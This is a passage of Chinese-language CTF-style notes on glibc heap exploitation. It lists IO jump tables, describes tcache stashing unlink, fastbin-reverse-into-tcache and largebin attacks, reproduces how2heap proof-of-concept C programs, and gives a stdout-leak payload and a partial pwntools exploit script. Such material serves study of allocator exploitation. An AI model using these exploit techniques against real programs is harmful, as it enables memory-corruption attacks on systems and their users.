class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="IO-cookie-jumps"><a href="#IO-cookie-jumps" class="headerlink" title="_IO_cookie_jumps"></a>_IO_cookie_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><ul>
<li>利用流程<br>1、假设目前<code>tcache bin</code>中已经有五个堆块，并且相应大小的<code>small bin</code>中已经有两个堆块，由<code>bk</code>指针连接为：<code>chunk_A&lt;-chunk_B</code><br>2、利用漏洞修改<code>chunk_A</code>的<code>bk</code>为<code>fake chunk</code>，并且修改<code>fake chunk</code>的<code>bk</code>为<code>target_addr - 0x10</code><br>3、通过<code>calloc()</code>越过<code>tcache bin</code>，直接从<code>small bin</code>中取出<code>chunk_B</code>返回给用户，并且会将<code>chunk_A</code>以及其所指向的<code>fake chunk</code>放入<code>tcache bin</code>（这里只会检测<code>chunk_A</code>的<code>fd</code>指针是否指向了<code>chunk_B</code>）<br>4、在<code>fake chunk</code>放入<code>tcache bin</code>之前，执行了<code>bck-&gt;fd = bin;</code>的操作（这里的<code>bck</code>就是<code>fake chunk</code>的<code>bk</code>，也就是<code>target_addr - 0x10</code>），故<code>target_addr - 0x10</code>的<code>fd</code>，也就<code>target_addr</code>地址会被写入一个与<code>libc</code>相关大数值（可利用）<br>5、再申请一次，就可以从<code>tcache</code>中获得<code>fake chunk</code>的控制权</li>
</ul>
<h4 id="poc-how2heap"><a href="#poc-how2heap" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h3><ul>
<li>利用流程:<br>1、申请<code>14</code>个<code>fastbin</code>范围内的<code>chunk</code>，然后释放<code>7</code>个用来填满<code>tcache</code>，然后将剩下的七个释放进<code>fastbin</code>中<br>2、修改第一个放进<code>fastbin</code>的<code>chunk</code>的<code>fd</code>为<code>&amp;target</code><br>3、通过申请<code>7</code>个<code>chunk</code>将<code>tcache</code>清空<br>4、申请一个<code>chunk</code>,此时由于<code>tcache</code>中已经没有<code>chunk</code>了，所以会去<code>fastbin</code>里拿，然后将<code>fastbin</code>中剩余的<code>chunk</code>转到<code>tcache</code>中，<code>fastbin</code>中有<code>7</code>个，分配一个，剩下六个，依次放进<code>tcache</code>中，而最先放入<code>fastbin</code>中的<code>chunk</code>的<code>fd</code>被我们改成了<code>&amp;target</code>，所以<code>tcache</code>会将<code>target</code>也当做一个<code>chunk</code>放进<code>tcache</code>中<br>5、此时<code>tcache</code>中有<code>7</code>个<code>chunk</code>，最后一个<code>chunk</code>即为<code>target</code></li>
</ul>
<h4 id="poc-how2heap-1"><a href="#poc-how2heap-1" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">	<span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">	<span class="type">size_t</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">	  	   <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Fill the tcache.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Fill the fastbin.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">	<span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">	<span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="type">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">			<span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">	<span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line">	<span class="comment">// a heap leak.</span></span><br><span class="line">	*(<span class="type">size_t</span>**)victim = (<span class="type">size_t</span>*)((<span class="type">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="type">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Empty tcache.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line">	</span><br><span class="line">	assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><ul>
<li>利用流程:<br>1、在<code>largebin list</code>中放入一个堆块<code>A</code>，并利用<code>UAF</code>等漏洞在<code>bk_nextsize</code>写入<code>target_addr - 0x20</code><br>2、释放一个大小略小于堆块<code>A</code>的堆块<code>B</code>进入到同一个<code>largebin list</code>，此时就会在<code>target_addr</code>中写入堆块B的地址</li>
</ul>
<h3 id="利用-IO-2-1-stdout-泄露地址"><a href="#利用-IO-2-1-stdout-泄露地址" class="headerlink" title="利用_IO_2_1_stdout_泄露地址"></a>利用_IO_2_1_stdout_泄露地址</h3><p>通常将<code>_flags</code>设置为<code>0xfbad1800</code> 设置<code>_IO_write_base</code>指向想要泄露的地方 <code>_IO_write_ptr</code>指向泄露结束的地址<br>之后遇到<code>puts</code>或<code>printf</code> 就会将<code>_IO_write_base</code>指向的内容打印出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="通过off-by-null进行unlink"><a href="#通过off-by-null进行unlink" class="headerlink" title="通过off_by_null进行unlink"></a>通过off_by_null进行unlink</h3><p>注意：通常第一个被释放的<code>chunk</code>不会被进行合并<br>某次做题时进行的操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap_base+<span class="number">0x2c0</span>  <span class="comment"># ptr指向第一个chunk的fd指针的位置(chunk 0)</span></span><br><span class="line">log.success(<span class="string">f&quot;ptr: <span class="subst">&#123;ptr:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x408</span>,p64(heap_base + <span class="number">0x7b0</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">0x3ff</span>+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># 0  前面的地址指向伪造的fake chunk的地址 即下面的edit(1)</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base + 0x7b0: <span class="subst">&#123;heap_base + <span class="number">0x7b0</span>:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x4f8</span>+<span class="string">&#x27;\n&#x27;</span>) <span 